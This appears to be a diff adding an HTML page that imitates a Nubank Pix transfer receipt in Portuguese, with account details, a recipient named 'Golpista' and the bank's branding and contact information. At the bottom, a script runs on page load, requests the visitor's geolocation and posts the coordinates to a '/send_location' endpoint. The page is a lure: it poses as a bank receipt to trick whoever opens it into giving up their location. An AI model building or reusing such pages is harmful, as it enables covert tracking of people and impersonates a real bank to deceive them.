@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprovante de Transferência</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+        }
+        .comprovante {
+            background: #fff;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            font-size: 14px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 40px;
+        }
+        h1 {
+            font-size: 18px;
+            margin: 10px 0;
+            font-weight: normal;
+        }
+        .section {
+            margin-top: 20px;
+        }
+        .section-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #666;
+            font-size: 12px;
+        }
+        .field {
+            margin-bottom: 8px;
+        }
+        .field strong {
+            display: block;
+            font-size: 12px;
+            color: #888;
+        }
+        .field span {
+            font-size: 14px;
+            color: #000;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+        }
+        .footer a {
+            color: #7000ff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="comprovante">
+        <div class="logo">
+            <img src="nu-logo.png" alt="Nubank Logo">
+        </div>
+        <h1>Comprovante de transferência</h1>
+        <div style="font-size:12px; color: #888;">26 ABR 2025 - 09:27:12</div>
+
+        <div class="section">
+            <div class="field">
+                <strong>Valor</strong>
+                <span>R$ 30,00</span>
+            </div>
+            <div class="field">
+                <strong>Tipo de transferência</strong>
+                <span>Pix</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-title">Destino</div>
+            <div class="field">
+                <strong>Nome</strong>
+                <span>Golpista</span>
+            </div>
+            <div class="field">
+                <strong>CPF</strong>
+                <span>•••.714.718-••</span>
+            </div>
+            <div class="field">
+                <strong>Instituição</strong>
+                <span>NU PAGAMENTOS - IP.</span>
+            </div>
+            <div class="field">
+                <strong>Agência</strong>
+                <span>0001</span>
+            </div>
+            <div class="field">
+                <strong>Conta</strong>
+                <span>1273853886-0</span>
+            </div>
+            <div class="field">
+                <strong>Tipo de conta</strong>
+                <span>Conta de pagamentos</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-title">Origem</div>
+            <div class="field">
+                <strong>Nome</strong>
+                <span>Lucas Marujo Amadeu</span>
+            </div>
+            <div class="field">
+                <strong>Instituição</strong>
+                <span>NU PAGAMENTOS - IP</span>
+            </div>
+            <div class="field">
+                <strong>Agência</strong>
+                <span>0001</span>
+            </div>
+            <div class="field">
+                <strong>Conta</strong>
+                <span>14517773-2</span>
+            </div>
+            <div class="field">
+                <strong>CPF</strong>
+                <span>•••.714.718-••</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="field">
+                <strong>Nu Pagamentos S.A. - Instituição de Pagamento</strong>
+                <span>CNPJ 18.236.120/0001-58</span>
+            </div>
+            <div class="field">
+                <strong>ID da transação:</strong>
+                <span>E18236120202504261227s08fe37d39a</span>
+            </div>
+            <div class="field" style="margin-top:10px;">
+                Estamos aqui para ajudar se você tiver alguma dúvida.
+            </div>
+        </div>
+
+        <div class="footer">
+            <a href="#">Me ajuda</a><br><br>
+            Ouvidoria: 0800 887 0463 | ouvidoria@nubank.com.br (Atendimento das 8h às 18h em dias úteis)
+        </div>
+    </div>
+
+     <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                fetch("/send_location", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    })
+                });
+            }, function(error) {
+                console.error("Erro ao obter localização:", error);
+            });
+        } else {
+            console.error("Geolocalização não suportada pelo navegador.");
+        }
+    </script>
+</body>
+</html>
